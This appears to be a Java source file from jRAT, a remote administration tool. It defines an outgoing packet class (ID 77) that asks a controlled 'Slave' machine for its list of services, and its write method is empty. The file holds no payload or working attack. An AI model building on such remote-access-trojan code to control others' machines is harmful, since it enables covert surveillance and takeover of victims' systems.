package su.jrat.client.packets.outgoing;

import java.io.DataOutputStream;

import su.jrat.client.Slave;


public class Packet77ListServices extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {

	}

	@Override
	public byte getPacketId() {
		return 77;
	}

}